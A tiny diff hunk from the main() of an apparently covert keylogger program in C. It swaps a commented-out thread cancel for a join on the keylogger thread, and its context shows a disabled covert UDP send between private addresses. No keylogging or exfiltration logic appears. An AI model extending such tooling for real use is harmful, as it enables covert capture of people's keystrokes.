@@ -93,6 +93,6 @@ int main(int argc, char **argv){
     covert_udp_send("192.168.0.118", "192.168.0.115", 8507, 8507, buf, 2);*/
  //   Packetcapture(pcapfilter,Filter,true);
 
- //   pthread_cancel(keylogger_thread);
+    pthread_join(keylogger_thread, NULL);
     return 0;
 }
